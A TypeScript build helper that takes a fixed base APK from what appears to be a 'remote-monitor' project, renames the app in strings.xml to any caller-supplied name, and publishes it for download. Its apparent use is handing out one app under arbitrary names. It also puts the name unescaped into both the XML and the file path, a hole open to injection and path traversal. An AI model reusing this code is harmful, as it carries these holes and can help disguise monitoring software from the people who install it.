import fs from "fs";
import path from "path";
import AdmZip from "adm-zip";

interface APKBuilderOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * ULTRA-SIMPLE APK BUILDER
 * Modifies strings.xml directly in the ZIP without decompiling
 * Fast, reliable, no apktool needed
 */
export async function buildUltraSimpleAPK(options: APKBuilderOptions): Promise<{
  success: boolean;
  apkPath?: string;
  downloadUrl?: string;
  filename?: string;
  error?: string;
}> {
  const baseAPK = "/home/ubuntu/remote-monitor/public/apks/Blockchain-Registered.apk";
  
  try {
    console.log(`[APK-BUILDER-ULTRA-SIMPLE] Starting build for: ${options.appName}`);

    // Verify base APK exists
    if (!fs.existsSync(baseAPK)) {
      throw new Error(`Base APK not found: ${baseAPK}`);
    }

    // Load APK as ZIP
    console.log(`[APK-BUILDER-ULTRA-SIMPLE] Loading APK...`);
    const zip = new AdmZip(baseAPK);

    // Modify strings.xml
    console.log(`[APK-BUILDER-ULTRA-SIMPLE] Modifying app name to: ${options.appName}`);
    const stringsEntry = zip.getEntry("res/values/strings.xml");
    
    if (stringsEntry) {
      let content = zip.readAsText(stringsEntry);
      
      // Replace app name
      content = content.replace(
        /<string name="app_name">.*?<\/string>/,
        `<string name="app_name">${options.appName}</string>`
      );
      
      // If not found, add it before </resources>
      if (!content.includes('name="app_name"')) {
        content = content.replace(
          "</resources>",
          `    <string name="app_name">${options.appName}</string>\n</resources>`
        );
      }
      
      zip.updateFile(stringsEntry, Buffer.from(content, "utf-8"));
    }

    // Write modified APK
    console.log(`[APK-BUILDER-ULTRA-SIMPLE] Writing modified APK...`);
    const filename = `${options.appName}-${Date.now()}.apk`;
    const outputDir = path.join(process.cwd(), "public", "apks");
    
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }

    const finalAPKPath = path.join(outputDir, filename);
    const buffer = zip.toBuffer();
    fs.writeFileSync(finalAPKPath, buffer);

    // Verify
    const stats = fs.statSync(finalAPKPath);
    console.log(`[APK-BUILDER-ULTRA-SIMPLE] APK created: ${(stats.size / 1024 / 1024).toFixed(2)}MB`);

    if (stats.size < 1000000) {
      throw new Error(`APK too small: ${stats.size} bytes`);
    }

    // Generate download URL
    const appDomain = process.env.VITE_APP_DOMAIN || "localhost:3000";
    const downloadUrl = `https://${appDomain}/download/${filename}`;

    console.log(`[APK-BUILDER-ULTRA-SIMPLE] Build completed successfully`);

    return {
      success: true,
      apkPath: finalAPKPath,
      downloadUrl,
      filename,
    };
  } catch (error) {
    console.error(`[APK-BUILDER-ULTRA-SIMPLE] Build failed:`, error);
    return {
      success: false,
      error: error instanceof Error ? error.message : String(error),
    };
  }
}
